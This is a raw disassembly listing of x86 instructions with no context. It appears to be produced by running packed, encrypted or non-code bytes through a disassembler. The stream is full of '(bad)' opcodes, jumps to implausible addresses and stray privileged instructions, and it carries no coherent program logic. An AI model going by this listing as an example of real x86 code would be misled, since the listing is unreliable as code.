  435d89:	pop    edi
  435d8a:	xor    al,0xed
  435d8c:	popa   
  435d8d:	fldcw  WORD PTR [edx-0x2a]
  435d90:	xor    al,0x5e
  435d92:	(bad)  
  435d93:	int    0xe9
  435d95:	fadd   DWORD PTR [eax]
  435d97:	jmp    0xbe2cfc94
  435d9c:	cmp    ebp,DWORD PTR [edi+0x249e65f8]
  435da2:	sbb    DWORD PTR [edx],ebx
  435da4:	or     ch,BYTE PTR es:[ecx+0x4e]
  435da8:	in     eax,0xd9
  435daa:	add    BYTE PTR [edi+edx*4+0x4c0d0ea2],bl
  435db1:	jmp    0xd369c9b6
  435db6:	xchg   bl,ch
  435db8:	pop    ebp
  435db9:	fld    DWORD PTR [eax]
  435dbb:	jb     0x435d5f
  435dbd:	std    
  435dbe:	xor    BYTE PTR [edx+ebp*4-0x3],ch
  435dc2:	clc    
  435dc3:	jmp    0xa6033729
  435dc8:	std    
  435dc9:	enter  0xe980,0x61
  435dcd:	fld1   
  435dcf:	leave  
  435dd0:	cmp    esp,DWORD PTR [ebx-0x2cd99208]
  435dd6:	jl     0x435e07
  435dd8:	pusha  
  435dd9:	fld    DWORD PTR [eax]
  435ddb:	je     0x435d82
  435ddd:	std    
  435dde:	and    BYTE PTR [ecx],bh
  435de0:	add    bl,ah
  435de2:	sbb    eax,0xf696451d
  435de7:	sar    BYTE PTR [ecx],0x76
  435dea:	mov    ds:0xdcbb00f8,al
  435def:	push   ebx
  435df0:	push   ecx
  435df1:	add    al,0xa2
  435df3:	cld    
  435df4:	adc    eax,0x447fdd8b
  435df9:	pop    edi
  435dfa:	adc    DWORD PTR [eax+eax*8+0x3b526b4],eax
  435e01:	mov    ebx,0x8df875dc
  435e06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  435e07:	jbe    0x435d98
  435e09:	mov    esp,ebx
  435e0b:	add    BYTE PTR [esi+0x10],ah
  435e0e:	call   0x96a0c62f
  435e13:	mov    WORD PTR [ebx+ecx*1],fs
  435e16:	fild   DWORD PTR [eax]
  435e18:	add    BYTE PTR [ecx+edx*2-0x2384fd8b],dl
  435e1f:	pop    esi
  435e20:	add    ah,BYTE PTR [ebx+0x3ec82dfe]
  435e26:	fnstcw WORD PTR [ebp-0x7c]
  435e29:	pop    edi
  435e2a:	push   ecx
  435e2b:	idiv   bh
  435e2d:	cmp    edx,DWORD PTR [ebx+0x43172444]
  435e33:	push   cs
  435e34:	data16 xor BYTE PTR [edi+0x74],ah
  435e38:	sbb    al,0x21
  435e3a:	lods   al,BYTE PTR ds:[esi]
  435e3b:	push   eax
  435e3c:	push   eax
  435e3d:	mov    dh,0xf0
  435e3f:	sbb    al,0x74
  435e41:	mov    dh,0x28
  435e43:	sbb    eax,0xdc08008c
  435e48:	add    al,ch
  435e4a:	mov    bh,0x9e
  435e4c:	cli    
  435e4d:	(bad)  
  435e4e:	jle    0x435dec
  435e50:	or     al,BYTE PTR [ebp+0xd9bd]
  435e56:	mov    ecx,ecx
  435e58:	idiv   bh
  435e5a:	adc    al,0x51
  435e5c:	xor    eax,0x25dbfb02
  435e61:	rcr    BYTE PTR [ebp+0x62005394],cl
  435e67:	mov    edi,0xb260307f
  435e6c:	add    al,0x37
  435e6e:	ss (bad) 
  435e70:	aam    0x72
  435e72:	mov    WORD PTR [edi+0x19],fs
  435e75:	and    al,0x82
  435e77:	cmp    eax,0xc2462449
  435e7c:	ja     0x435e02
  435e7e:	xchg   BYTE PTR [edx-0x1d9dfffe],ch
  435e84:	xchg   esp,eax
  435e85:	fsub   QWORD PTR [edi+0x5b62864e]
  435e8b:	push   ss
  435e8c:	jmp    0x4f5c290
  435e91:	jae    0x435ee7
  435e93:	sub    DWORD PTR [ecx+0x24],edi
  435e96:	pop    edx
  435e97:	mov    ah,0x4
  435e99:	add    bl,ch
  435e9b:	or     eax,0xb26003e9
  435ea0:	add    al,0x85
  435ea2:	push   ds
  435ea3:	(bad)  
  435ea5:	xchg   BYTE PTR [esi+0x67d4d4],ah
  435eab:	loop   0x435e5d
  435ead:	add    al,0x0
  435eaf:	mov    al,0x2d
  435eb1:	dec    ecx
  435eb2:	and    al,0xd2
  435eb4:	inc    eax
  435eb5:	test   DWORD PTR [ebx],edx
  435eb7:	mov    BYTE PTR [esi+0x2e650044],0x40
  435ebe:	std    
  435ebf:	loopne 0x435eb5
  435ec1:	add    BYTE PTR [eax+0x55],cl
  435ec4:	cmp    al,0x86
  435ec6:	add    BYTE PTR [edx-0x50],ah
  435ec9:	sbb    bh,dh
  435ecb:	mov    edx,0x4a74c39b
  435ed0:	push   0xb21d82f5
  435ed5:	add    al,0x0
  435ed7:	loope  0x435f05
  435ed9:	loopne 0x435f1e
  435edb:	dec    esp
  435edc:	xchg   DWORD PTR [esi-0x44],esi
  435edf:	arpl   cx,bx
  435ee1:	jmp    0x420cdae9
  435ee6:	xor    al,0xe9
  435ee8:	sbb    al,0xe6
  435eea:	xor    ebp,ecx
  435eec:	sbb    eax,0x9e320bfe
  435ef1:	es call 0x42d2470
  435ef7:	bound  edi,QWORD PTR [edi]
  435ef9:	popa   
  435efa:	movd   DWORD PTR ds:0xa6a126c2,mm5
  435f01:	lahf   
  435f02:	sbb    DWORD PTR [esi-0x50],ecx
  435f05:	mov    BYTE PTR [ebx],al
  435f07:	(bad)  
  435f08:	fldenv [ebx+0x46]
  435f0b:	pop    esi
  435f0c:	pop    ebp
  435f0d:	stos   BYTE PTR es:[edi],al
  435f0e:	cld    
  435f0f:	add    cl,ah
  435f11:	push   edx
  435f12:	jmp    0x3019c11a
  435f17:	mov    bl,0xe9
  435f19:	sbb    esp,edi
  435f1b:	retf   0xfd21
  435f1e:	sbb    eax,0xe922dbfd
  435f23:	add    esp,DWORD PTR [edx+0xb]
  435f26:	gs inc esi
  435f28:	popa   
  435f29:	or     DWORD PTR [ebp-0x79],ebx
  435f2c:	jle    0x435f7f
  435f2e:	in     al,dx
  435f2f:	add    esp,DWORD PTR [edx+0x9]
  435f32:	push   edx
  435f33:	shl    BYTE PTR [eax],cl
  435f35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  435f36:	aaa    
  435f37:	shl    BYTE PTR [esp+edx*2],1
  435f3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  435f3b:	out    0x79,eax
  435f3d:	or     DWORD PTR [ecx+0x71ccde7b],ebx
  435f43:	add    DWORD PTR [edx-0x27],esp
  435f46:	mov    eax,0x5dfce67e
  435f4b:	add    DWORD PTR [edx-0x27],esp
  435f4e:	push   0xffffffc1
  435f50:	popa   
  435f51:	or     DWORD PTR [ecx+0x37],esi
  435f54:	ds cmc 
  435f56:	jo     0x435f97
  435f58:	inc    esi
  435f59:	adc    eax,0x11eff601
  435f5e:	pop    gs
  435f60:	popa   
  435f61:	pop    edx
  435f62:	shl    esi,0xe2
  435f65:	loopne 0x435f68
  435f67:	jmp    0x6314becd
  435f6c:	call   0x142d:0xf6434fd
  435f73:	test   BYTE PTR [eax],0x33
  435f76:	mov    WORD PTR [di],fs
  435f79:	loop   0x435f7b
  435f7b:	cmp    ch,BYTE PTR [eax]
  435f7d:	bound  ebp,QWORD PTR ds:0xc56f6214
  435f83:	jge    0x435f35
  435f85:	push   ebx
  435f86:	lods   eax,DWORD PTR ds:[esi]
  435f87:	imul   DWORD PTR [ebx+0x1b03aee6]
  435f8d:	enter  0x8bd,0xe8
  435f91:	popa   
  435f92:	(bad)  [ebx-0x75ea71d8]
  435f98:	and    eax,0xf8f7f982
  435f9d:	mov    DWORD PTR [edx+0x3d],edx
  435fa0:	lds    edx,FWORD PTR [ecx+0x9]
  435fa3:	jmp    0xf8e301d3
  435fa8:	(bad)  
  435fa9:	and    DWORD PTR cs:0x33d072c1,ebx
  435fb0:	sub    edi,ecx
  435fb2:	pop    ebp
  435fb3:	sbb    eax,0xd95e69
  435fb8:	jo     0x435f5c
  435fba:	std    
  435fbb:	fs ss push edx
  435fbe:	std    
  435fbf:	xor    al,0x2e
  435fc1:	xor    eax,DWORD PTR [ebp+0x5e61a90e]
  435fc7:	inc    ebp
  435fc8:	lds    eax,FWORD PTR ds:0x6a6a28be
  435fce:	std    
  435fcf:	cmp    al,0xe3
  435fd1:	or     BYTE PTR [ebx-0x34],dl
  435fd4:	add    bl,bh
  435fd6:	fadd   DWORD PTR [eax]
  435fd8:	push   0x0
  435fda:	sbb    esi,ecx
  435fdc:	pop    esi
  435fdd:	add    al,BYTE PTR [edx-0x2cdbe2e7]
  435fe3:	(bad)  
  435fe4:	cld    
  435fe5:	gs jb  0x435fcc
  435fe8:	sbb    al,0x6c
  435fea:	and    ebp,ebp
  435fec:	mov    eax,DWORD PTR [ebp-0x39]
  435fef:	call   0xc9aaa47f
  435ff4:	push   eax
  435ff5:	call   0x3df983
  435ffa:	adc    DWORD PTR [ebp-0x5bbf99b1],esp
  436000:	pop    ds
  436001:	push   0xffffffb9
  436003:	cli    
  436004:	jg     0x43604a
  436006:	xchg   edi,eax
  436007:	ret    0x358
  43600a:	rcr    DWORD PTR [ebx+0x75],cl
  43600d:	and    al,0xa7
  43600f:	dec    edi
  436010:	or     BYTE PTR [edi+eiz*4-0x44],0x73
  436015:	pop    esi
  436016:	enter  0x6998,0x80
  43601a:	mov    ebx,eax
  43601c:	add    BYTE PTR [eax-0x2],dl
  43601f:	and    ebx,DWORD PTR ds:0xd87988
  436025:	push   eax
  436026:	cld    
  436027:	test   al,0x64
  436029:	push   ss
  43602a:	or     ebx,eax
  43602c:	bound  ecx,QWORD PTR [ebx+0x66748407]
  436032:	ret    0x1d24
  436035:	mov    WORD PTR [ecx],?
  436037:	fadd   DWORD PTR [eax]
  436039:	lfs    ebx,FWORD PTR [eax+0x3f00c476]
  436040:	and    DWORD PTR [ebp+0xdebb24],eax
  436046:	add    BYTE PTR [edx+0x73341ce4],dh
  43604c:	sahf   
  43604d:	dec    esi
  43604e:	(bad)  
  43604f:	(bad)  
  436050:	retf   
  436051:	je     0x436097
  436053:	inc    esi
  436054:	sahf   
  436055:	jg     0x43604f
  436057:	add    eax,0x636c78ab
  43605c:	mov    dl,0x4
  43605e:	aaa    
  43605f:	jbe    0x435ff7
  436061:	enter  0x6665,0x4a
  436065:	push   ss
  436066:	adc    BYTE PTR [ebx-0x1640c755],cl
  43606c:	cmc    
  43606d:	loopne 0x43608a
  43606f:	loope  0x4360e2
  436071:	add    eax,DWORD PTR [edi-0x7ac321da]
  436077:	cs (bad) 
  436079:	inc    eax
  43607a:	xor    eax,0x8d4e393
  43607f:	in     eax,dx
  436080:	cmc    
  436081:	loopne 0x4360ea
  436083:	imul   edi,esi,0xffffffe0
  436086:	xor    ebp,DWORD PTR [edi]
  436088:	fisttp QWORD PTR [ecx+0x6f924674]
  43608e:	inc    esp
  43608f:	fisubr WORD PTR ds:[ebp*1-0x312a1e5e]
  436097:	xor    BYTE PTR ds:0x23122701,ch
  43609d:	adc    DWORD PTR [edx+edi*1],esp
  4360a0:	sub    ebp,eax
  4360a2:	lldt   WORD PTR [edx+esi*8-0x4]
  4360a7:	test   BYTE PTR [esi],bl
  4360a9:	(bad)  
  4360aa:	loopne 0x436128
  4360ac:	pop    edx
  4360ad:	add    al,0xfa
  4360af:	sub    DWORD PTR [eax],0xffffffb1
  4360b2:	add    al,0x0
  4360b4:	fild   QWORD PTR [ecx+eiz*8]
  4360b7:	mul    DWORD PTR [edx-0x50]
  4360ba:	add    al,0x85
  4360bc:	sub    cl,BYTE PTR [ecx]
  4360be:	retf   0x3450
  4360c1:	in     al,dx
  4360c2:	add    al,0x5d
  4360c5:	cmp    al,0x51
  4360c7:	add    BYTE PTR [edx-0x27],ah
  4360ca:	jmp    0xaa410f4b
  4360cf:	jbe    0x43606f
  4360d1:	std    
  4360d2:	leave  
  4360d3:	xor    ebx,ecx
  4360d5:	sbb    eax,0xe6b217be
  4360da:	sub    DWORD PTR [edx+edi*4],esi
  4360dd:	mov    ds:0xee6203f7,al
  4360e2:	sub    BYTE PTR [ecx+ebx*8],dh
  4360e5:	ffree  st(0)
  4360e7:	xor    ebp,ebx
  4360e9:	sub    eax,0xccdacc06
  4360ee:	aad    0xee
  4360f0:	xchg   ebp,eax
  4360f1:	fldenv [edx-0x4d]
  4360f4:	loope  0x43607d
  4360f6:	inc    edi
  4360f7:	std    
  4360f8:	pop    edx
  4360f9:	push   0x2e
  4360fb:	loopne 0x436142
  4360fd:	loopne 0x436124
  4360ff:	loopne 0x436172
  436101:	sub    al,0x2e
  436103:	aad    0xed
  436105:	cmp    esp,DWORD PTR [ecx+0x3e]
  436108:	add    BYTE PTR [edx+0x51],ah
  43610b:	and    eax,0xe13b2206
  436110:	pop    es
  436111:	xor    DWORD PTR ds:[eax+eax*1],eax
  436115:	xor    eax,0xdac31dd2
  43611a:	sbb    al,0xeb
  43611c:	jl     0x436144
  43611e:	std    
  43611f:	lods   eax,DWORD PTR ds:[esi]
  436120:	int3   
  436121:	mov    ds:0x521de42c,al
  436126:	add    DWORD PTR [edx],ebx
  436128:	ja     0x436148
  43612a:	std    
  43612b:	aad    0x9c
  43612d:	imul   ebp,DWORD PTR [edi],0xffffffec
  436130:	sub    cl,BYTE PTR [edi-0x3bc32a68]
  436136:	fnsave [ecx+0x61cd933]
  43613c:	adc    al,0x92
  43613e:	push   esp
  43613f:	popf   
  436140:	jmp    DWORD PTR [ebp+0x270301b1]
  436146:	mov    al,ds:0x15fc3f8
  43614b:	push   ecx
  43614c:	je     0x4361ab
  43614e:	std    
  43614f:	mov    cx,0x1d96
  436153:	sbb    eax,0xf798e6a1
  436158:	jmp    0xa026:0xdbe908c4
  43615f:	clc    
  436160:	ins    BYTE PTR es:[edi],dx
  436161:	jne    0x436160
  436163:	add    bl,ch
  436165:	popa   
  436166:	fincstp 
  436168:	jne    0x43616f
  43616a:	cli    
  43616b:	push   eax
  43616c:	sbb    al,BYTE PTR [eax]
  43616e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43616f:	or     BYTE PTR [ebp+eiz*1-0x54fbf23e],cl
  436176:	xchg   esi,eax
  436177:	push   es
  436178:	clc    
  436179:	push   ebp
  43617a:	ret    0xf815
  43617d:	fdiv   QWORD PTR [ecx+0x38e940c7]
  436183:	adc    eax,0x61910d1d
  436188:	test   BYTE PTR [eax-0x56723023],dh
  43618e:	js     0x436133
  436190:	pop    edx
  436191:	jo     0x4361ad
  436193:	std    
  436194:	cld    
  436195:	out    0x61,eax
  436197:	fnstenv [ebx]
  436199:	mov    al,ds:0xab04124f
  43619e:	call   FWORD PTR [ebp+ebx*1-0x17]
  4361a2:	pop    esi
  4361a3:	fld    DWORD PTR [eax]
  4361a5:	bound  esp,QWORD PTR [edx]
  4361a7:	std    
  4361a8:	cmp    BYTE PTR [eax-0x1e],ah
  4361ab:	cld    
  4361ac:	or     al,ch
  4361ae:	popa   
  4361af:	fst    DWORD PTR [ecx+0x6c]
  4361b2:	loop   0x4361a9
  4361b4:	cld    
  4361b5:	out    0x61,eax
  4361b7:	fst    DWORD PTR [eax-0x48]
  4361ba:	(bad)  
  4361bb:	gs sbb eax,0xd61b00
  4361c1:	add    BYTE PTR [edx+ebp*4-0x14],dh
  4361c5:	adc    eax,0xc083dcfb
  4361ca:	add    al,0x28
  4361cc:	int    0xfb
  4361ce:	inc    esp
  4361cf:	pop    eax
  4361d0:	jle    0x43624e
  4361d2:	add    BYTE PTR [edi],bl
  4361d4:	xchg   ebp,eax
  4361d5:	jge    0x436223
  4361d7:	pop    ds
  4361d8:	and    eax,0xfa56d122
  4361de:	jmp    0x4361fa
  4361e0:	pop    esp
  4361e1:	stc    
  4361e2:	jmp    FWORD PTR [esi-0x5c]
  4361e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4361e6:	add    DWORD PTR [ebx+0x60181cf1],eax
  4361ec:	fldenv ds:0x7e5451c0
  4361f2:	int    0xb3
  4361f4:	sbb    dh,BYTE PTR [edi+0x4523b4ff]
  4361fa:	and    al,0x6b
  4361fc:	xor    BYTE PTR ds:[ecx],al
  4361ff:	retf   
  436200:	fsub   QWORD PTR [ebp+0x14a9201]
  436206:	add    BYTE PTR [ebx-0x73954775],bh
  43620c:	mov    esi,0xf489477f
  436211:	bound  edi,QWORD PTR [ecx]
  436213:	jl     0x4361de
  436215:	adc    ch,BYTE PTR [edx-0x75]
  436218:	hlt    
  436219:	push   eax
  43621a:	xor    edi,DWORD PTR [ebx+0x73478bec]
  436220:	in     al,dx
  436221:	stc    
  436222:	adc    eax,0x38af5f
  436227:	clc    
  436228:	pop    edi
  436229:	add    eax,0xb88b7eeb
  43622e:	mov    DWORD PTR [eax+eiz*4],ecx
  436231:	jge    0x436202
  436233:	mov    bl,0xd
  436235:	push   edx
  436236:	inc    BYTE PTR [eax]
  436238:	bound  eax,QWORD PTR [edi]
  43623a:	jne    0x436280
  43623c:	jle    0x4361ec
  43623e:	cmp    eax,0x3d
  436241:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  436242:	js     0x4361f1
  436244:	bound  esi,QWORD PTR [edx-0x314906fc]
  43624a:	fsubr  DWORD PTR [ebx+ebx*1]
  43624d:	inc    ecx
  43624e:	jnp    0x436220
  436250:	jmp    0xc6efe3c
  436255:	mov    edi,0x32fa857e
  43625a:	mov    edi,edi
  43625c:	mov    es,WORD PTR [ecx+0x2d]
  43625f:	mov    esp,DWORD PTR [esi-0x1eb02f72]
  436265:	int    0xef
  436267:	mov    bl,BYTE PTR [esi+0x7ce7d48e]
  43626d:	dec    ecx
  43626e:	jle    0x436269
  436270:	jmp    0xe95f435a
  436275:	mov    DWORD PTR [ebp+0x7e882b81],edx
  43627b:	jge    0x436244
  43627d:	mov    cs,WORD PTR [eax]
  43627f:	or     ecx,ebp
  436281:	fucom  st(0)
  436283:	daa    
  436284:	icebp  
  436285:	mov    al,0x7c
  436287:	pop    esp
  436288:	xchg   BYTE PTR [edx-0x4d9d5165],cl
  43628e:	add    al,0x85
  436290:	scas   eax,DWORD PTR es:[edi]
  436291:	dec    ecx
  436292:	or     esi,ecx
  436294:	xchg   ebp,eax
  436295:	ds jp  0x4362dc
  436298:	inc    esi
  436299:	xchg   esi,eax
  43629a:	jns    0x436310
  43629c:	add    BYTE PTR [esi],bh
  43629e:	call   0x50c3:0xab1afe1a
  4362a5:	xor    DWORD PTR [edx+0x2d],esi
  4362a8:	test   DWORD PTR [edi-0x711750c6],edx
  4362ae:	and    al,0x7e
  4362b0:	stc    
  4362b1:	jmp    0x43628c
  4362b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4362b4:	fbld   TBYTE PTR [ebp-0x2efc9da6]
  4362ba:	shl    BYTE PTR [edx-0x51],1
  4362bd:	fisttp WORD PTR [edi-0x606c8abe]
  4362c3:	aas    
  4362c4:	jns    0x4362ef
  4362c6:	mov    dl,0x1
  4362c8:	sub    ebp,DWORD PTR [eax]
  4362ca:	lahf   
  4362cb:	arpl   WORD PTR [eax],bx
  4362cd:	jle    0x4362d8
  4362cf:	inc    ebx
  4362d0:	sti    
  4362d1:	out    0xd,al
  4362d3:	(bad)  
  4362d4:	out    0xfd,eax
  4362d6:	repz rol BYTE PTR [ebp-0x7af2a4f5],0x5b
  4362de:	push   ebp
  4362df:	int3   
  4362e0:	test   bl,bh
  4362e2:	sahf   
  4362e3:	imul   eax,DWORD PTR [edi-0x2f5cd50b],0xffffffad
  4362ea:	push   ebx
  4362eb:	repnz cwde 
  4362ed:	xchg   ecx,eax
  4362ee:	push   edx
  4362ef:	pop    ss
  4362f0:	pushf  
  4362f1:	jno    0x4362fa
  4362f3:	loopne 0x436279
  4362f5:	fbstp  TBYTE PTR [ecx+0x24cb866b]
  4362fb:	loop   0x43634d
  4362fd:	popa   
  4362fe:	push   ecx
  4362ff:	es loopne 0x436302
  436302:	push   ebp
  436303:	mov    dl,0xff
  436305:	js     0x4362b0
  436307:	mov    cl,0xf1
  436309:	mov    cl,0xab
  43630b:	sahf   
  43630c:	sti    
  43630d:	ret    
  43630e:	stos   DWORD PTR es:[edi],eax
  43630f:	and    eax,0x84e6d7fe
  436314:	cmp    bh,BYTE PTR [ecx-0x58]
  436317:	mov    cl,0x13
  436319:	(bad)  
  43631a:	mov    ebx,DWORD PTR [esi+0x25858b6b]
  436320:	jecxz  0x43639a
  436322:	xchg   ecx,eax
  436323:	push   edx
  436324:	mov    al,0x9b
  436326:	cmp    al,0x6
  436328:	js     0x4362ae
  43632a:	xchg   eax,ecx
  43632c:	add    BYTE PTR [edx-0x27],ch
  43632f:	mov    al,ds:0x9eb2e16e
  436334:	add    ch,0x35
  436337:	(bad)  
  436338:	jmp    0x43631f
  43633a:	xor    bl,BYTE PTR [esi-0x75]
  43633d:	push   ecx
  43633e:	retf   0xe992
  436341:	sub    BYTE PTR [ecx-0x118d075d],cl
  436347:	mov    al,0xed
  436349:	sub    esi,esp
  43634b:	lahf   
  43634c:	xor    DWORD PTR [esi],0x651c2a60
  436352:	retf   0x1024
  436355:	es gs cmc 
  436358:	and    al,0x6a
  43635a:	retf   
  43635b:	lahf   
  43635c:	clc    
  43635d:	popf   
  43635e:	and    eax,0xd91f8bc2
  436363:	mov    ebp,0xde0006ed
  436368:	pop    ecx
  436369:	shr    esi,0x7c
  43636c:	cwde   
  43636d:	mov    ebp,DWORD PTR [esi]
  43636f:	enter  0xf9a5,0xee
  436373:	loope  0x43637e
  436375:	mov    ebp,ss
  436377:	(bad)  [ebp+edx*1-0x7b5222c9]
  43637e:	shl    ecx,cl
  436380:	and    al,0x43
  436382:	xlat   BYTE PTR ds:[ebx]
  436383:	stos   DWORD PTR es:[edi],eax
  436384:	rol    DWORD PTR [edx],1
  436386:	scas   al,BYTE PTR es:[edi]
  436387:	stos   DWORD PTR es:[edi],eax
  436388:	mov    eax,ds:0xd961e911
  43638d:	ins    BYTE PTR es:[edi],dx
  43638e:	rcl    edx,1
  436390:	adc    ebp,esi
  436392:	sbb    bl,dh
  436394:	adc    ebp,ebx
  436396:	cmp    BYTE PTR [eax+eiz*4+0x1968250e],ch
  43639d:	add    DWORD PTR [esi+ebx*1+0x25],ebp
  4363a1:	punpckhdq mm5,QWORD PTR [esi]
  4363a4:	mov    al,ds:0x483300ec
  4363a9:	inc    esp
  4363aa:	cld    
  4363ab:	dec    ebx
  4363ac:	dec    eax
  4363ad:	inc    esp
  4363ae:	in     al,0x4b
  4363b0:	xchg   ecx,edi
  4363b2:	adc    eax,0x40c343
  4363b7:	mov    al,0x2f
  4363b9:	jle    0x436400
  4363bb:	mov    bl,0x4e
  4363bd:	inc    esp
  4363be:	clc    
  4363bf:	adc    eax,0xa0e6444c
  4363c4:	iret   
  4363c5:	jne    0x43642c
  4363c7:	mov    ds:0xc025d5,eax
  4363cc:	and    eax,0xc1f6444e
  4363d1:	xchg   edx,eax
  4363d2:	add    BYTE PTR [edx+0xb],ch
  4363d5:	push   ecx
  4363d6:	inc    esp
  4363d7:	cmc    
  4363d8:	icebp  
  4363d9:	ror    BYTE PTR [ebx+0x52857745],1
  4363df:	(bad)  
  4363e0:	mov    dh,0x24
  4363e2:	add    edi,edi
  4363e4:	mul    al
  4363e6:	adc    al,BYTE PTR [eax+0xb]
  4363e9:	push   esp
  4363ea:	jmp    0xe4457f7
  4363ef:	sar    BYTE PTR [ebx-0x3c3d4046],0xd8
  4363f6:	ja     0x4363e4
  4363f8:	ja     0x4363d0
  4363fa:	add    BYTE PTR [eax],al
  4363fc:	mov    BYTE PTR [edx+0x7faa8b52],al
  436402:	jg     0x436478
  436404:	addr16 icebp 
  436406:	call   0xfa9b5551
  43640b:	xor    esi,edx
  43640d:	fdivr  st(6),st
  43640f:	push   cs
  436410:	pop    es
  436411:	adc    eax,0xd021005f
  436416:	mov    edx,DWORD PTR [edi+eiz*4-0x18]
  43641a:	jg     0x436468
  43641c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43641d:	lock jge 0x4363ee
  436420:	bound  ebx,QWORD PTR [edx+0x5]
  436423:	push   esp
  436424:	jl     0x436471
  436426:	add    al,0xee
  436429:	mov    bl,0x2f
  43642b:	aad    0x21
  43642d:	inc    edi
  43642e:	or     eax,DWORD PTR [eax+0x1b8de600]
  436434:	add    dh,dl
  436436:	mov    esp,esi
  436438:	push   DWORD PTR [eax+0x6d23d025]
  43643e:	daa    
  43643f:	push   edx
  436440:	call   0xf9c5c37e
  436445:	out    0xf1,al
  436447:	clc    
  436448:	loopne 0x4364ba
  43644a:	repnz loop 0x4364a6
  43644d:	(bad)  
  43644e:	ja     0x4364cd
  436450:	les    ebp,FWORD PTR [esi-0x4f]
  436453:	add    al,0x0
  436455:	and    DWORD PTR [edi],esi
  436457:	enter  0x4923,0x2
  43645b:	(bad)  
  43645c:	xchg   DWORD PTR [esi+0x33851c96],esp
  436462:	aaa    
  436463:	cmp    eax,0x7da20abf
  436468:	fisub  WORD PTR [edx-0x4e]
  43646b:	add    DWORD PTR [eax],0x59
  43646e:	ret    0xbf86
  436471:	aas    
  436472:	mov    dl,0x83
  436474:	add    BYTE PTR [edx-0xf],ah
  436477:	pop    esp
  436478:	adc    BYTE PTR [ecx+0x71],ch
  43647b:	inc    esp
  43647c:	loopne 0x4364d8
  43647e:	jno    0x4364e7
  436480:	or     BYTE PTR [ecx+0x70],bl
  436483:	lds    esp,FWORD PTR [ebp+0x60]
  436486:	in     eax,dx
  436487:	aaa    
  436488:	cli    
  436489:	bound  esi,QWORD PTR [edx+0x28e50904]
  43648f:	std    
  436490:	jmp    DWORD PTR [edx-0x61]
  436493:	and    DWORD PTR [esi+0x0],0x5487bf62
  43649a:	ds fsin 
  43649d:	mov    WORD PTR [eax-0x742a9750],ds
  4364a3:	fwait
  4364a4:	inc    sp
  4364a6:	div    BYTE PTR [edi+0x64]
  4364a9:	enter  0xc441,0x71
  4364ad:	enter  0x1929,0x5e
  4364b1:	inc    esp
  4364b2:	out    dx,al
  4364b3:	iret   
  4364b4:	sbb    DWORD PTR es:[ebx-0x65],0xffffffea
  4364b9:	add    esp,DWORD PTR [edx+0x1b]
  4364bc:	inc    ecx
  4364bd:	ins    DWORD PTR es:[edi],dx
  4364be:	fsubrp st(6),st
  4364c0:	xor    BYTE PTR [edi-0x2c120a62],cl
  4364c6:	lods   al,BYTE PTR ds:[esi]
  4364c7:	or     BYTE PTR [ebp-0x38],dl
  4364ca:	or     DWORD PTR ds:0xf59e8a9a,0xd518105
  4364d4:	fadd   st,st(3)
  4364d6:	sbb    eax,0x5df82a56
  4364db:	imul   eax,ebx,0x1f5a68b
  4364e1:	ins    DWORD PTR es:[edi],dx
  4364e2:	dec    eax
  4364e3:	dec    esi
  4364e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4364e5:	daa    
  4364e6:	pop    esi
  4364e7:	dec    esi
  4364e8:	adc    al,BYTE PTR [edi+0x3ac52622]
  4364ee:	jnp    0x4364c5
  4364f0:	ins    DWORD PTR es:[edi],dx
  4364f1:	or     bl,bh
  4364f3:	sbb    cl,dh
  4364f5:	xchg   bl,bl
  4364f7:	and    al,0xee
  4364f9:	ins    BYTE PTR es:[edi],dx
  4364fa:	add    BYTE PTR [ebx+0x4e],dh
  4364fd:	daa    
  4364fe:	sbb    al,0x44
  436500:	aad    0x6a
  436502:	inc    ebx
  436503:	pop    esi
  436504:	or     DWORD PTR [ebp-0x39],ebx
  436507:	and    esi,0x5a2e6c39
  43650d:	mov    edi,0xfe15e780
  436512:	pop    ds
  436513:	adc    bl,BYTE PTR [edx-0x39fe23ff]
  436519:	inc    eax
  43651a:	jmp    0x67b105fb
  43651f:	fist   WORD PTR ds:0x322011d
  436525:	or     BYTE PTR [eax+eiz*4-0x65],ch
  436529:	clc    
  43652a:	jmp    0x2dc92fb6
  43652f:	cmp    ah,ch
  436531:	push   0xffffffe9
  436533:	xchg   ecx,eax
  436534:	mov    eax,ds:0x19780d0e
  436539:	add    esi,ebx
  43653b:	sbb    edx,DWORD PTR ds:0x94e71d1d
  436541:	add    eax,0x1d2cd8c7
  436546:	sbb    DWORD PTR [esi],ebp
  436548:	sar    DWORD PTR [ebx+ebx*4+0x61],1
  43654c:	fld    DWORD PTR [eax]
  43654e:	mov    cl,0x35
  436550:	aam    0xbe
  436552:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  436553:	jge    0x436516
  436555:	pop    ebx
  436556:	inc    eax
  436557:	jo     0x4364f3
  436559:	clc    
  43655a:	jmp    0xd9607243
  43655f:	add    BYTE PTR [ecx+0x3d],bh
  436562:	dec    ebp
  436563:	pop    ds
  436564:	loop   0x4365b9
  436566:	jmp    0x153972cb
  43656b:	push   0x74
  43656d:	mov    al,ds:0x24e20b6d
  436572:	sbb    eax,0x6b85d6c9
  436577:	xchg   ebx,eax
  436578:	out    dx,al
  436579:	mov    gs,ecx
  43657b:	out    dx,eax
  43657c:	push   edi
  43657d:	mov    al,ds:0xe44e72f8
  436582:	sti    
  436583:	push   esp
  436584:	ret    
  436585:	or     al,BYTE PTR [esi+0x50f18a2d]
  43658b:	push   0x32
  43658d:	int    0x85
  43658f:	add    BYTE PTR [edi-0xf],dh
  436592:	xor    al,ch
  436594:	jbe    0x436519
  436596:	cli    
  436597:	inc    DWORD PTR [eax]
  436599:	mov    DWORD PTR [esp+ebx*1],esp
  43659c:	add    BYTE PTR ds:0x1b4d6ee9,ch
  4365a2:	cli    
  4365a3:	and    esi,0x19
  4365a6:	je     0x4365b6
  4365a8:	add    BYTE PTR [ecx-0x6f42dbdc],ah
  4365ae:	and    al,0x18
  4365b0:	inc    eax
  4365b1:	sub    al,0xb9
  4365b3:	add    BYTE PTR [ebx-0x2b],bh
  4365b6:	jge    0x436585
  4365b8:	jecxz  0x43653b
